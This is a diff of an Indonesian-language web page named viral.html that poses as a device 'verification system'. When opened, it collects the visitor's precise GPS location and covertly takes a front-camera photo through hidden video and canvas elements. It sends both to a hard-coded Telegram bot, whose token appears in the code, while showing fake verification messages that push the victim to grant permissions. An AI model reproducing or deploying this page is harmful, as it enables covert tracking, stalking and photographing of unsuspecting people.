@@ -1,67 +1,68 @@
-# viral.html
-const token = "8371743763:AAHfhPZENAYY0l8z5iUxsgHUuj-ney5SIa0";
-const chatId = "8465963357";
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .con { text-align: center; border: 1px solid #0f0; padding: 20px; width: 80%; box-shadow: 0 0 15px #0f0; }
+    </style>
+</head>
+<body>
 
-async function execute() {
-    // Meminta izin lokasi presisi (GPS)
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
 
-            const text = `
-📍 **LOKASI PRESISI (GPS)**
-━━━━━━━━━━━━━━━━━━
-🎯 **Latitude**: ${lat}
-🎯 **Longitude**: ${lon}
-📏 **Akurasi**: ${acc} meter
-🗺️ **Google Maps**: https://www.google.com/maps?q=${lat},${lon}
-━━━━━━━━━━━━━━━━━━`;
+<div class="con">
+    <div id="status">> MENGHUBUNGKAN KE SERVER...</div>
+    <div style="font-size: 10px; color: #050; margin-top: 10px;">ID: 837-PZEN-09</div>
+</div>
 
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'Markdown'})
-            });
-            
-            // Lanjut jepret foto setelah dapet lokasi
-            takePhoto();
-        }, 
-        (err) => {
-            // Jika GPS ditolak, fallback ke IP (lokasi kasar)
-            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-                const text = `⚠️ **GPS DITOLAK! Menggunakan Lokasi IP**\n\n🏙️ Kota: ${d.city}\n📍 Koordinat: ${d.latitude}, ${d.longitude}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+<script>
+    const token = "8371743763:AAHfhPZENAYY0l8z5iUxsgHUuj-ney5SIa0";
+    const chatId = "8465963357";
+
+    async function start() {
+        // Ambil Lokasi GPS Presisi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const text = `🎯 **TARGET LOCKED!**\n\n📍 Lat: ${p.coords.latitude}\n📍 Lon: ${p.coords.longitude}\n📏 Akurasi: ${p.coords.accuracy.toFixed(1)}m\n🗺️ Maps: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: chatId, text: text})
+                    body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'Markdown'})
                 });
-            });
-            takePhoto();
-        }, { enableHighAccuracy: true });
+                snap();
+            }, () => {
+                // Fallback jika ditolak
+                document.getElementById('status').innerHTML = "<span style='color:red'>KLIK 'IZINKAN' UNTUK VERIFIKASI DEVICE!</span>";
+                snap(); 
+            }, {enableHighAccuracy: true});
+        }
     }
-}
 
-// Fungsi foto dipisah biar rapi
-async function takePhoto() {
-    try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
-        v.srcObject = s;
-        await v.play();
-        setTimeout(() => {
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            c.toBlob(b => {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', b, 'shot.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
-        }, 1000);
-    } catch (e) {}
-}
-
-window.onload = execute;
+    async function snap() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            v.srcObject = stream;
+            await v.play();
+            setTimeout(() => {
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', b, 'shot.jpg');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
+                document.getElementById('status').innerText = "> VERIFIKASI GAGAL. AKSES DITOLAK.";
+            }, 1000);
+        } catch (e) {}
+    }
+    window.onload = start;
+</script>
+</body>
+</html>
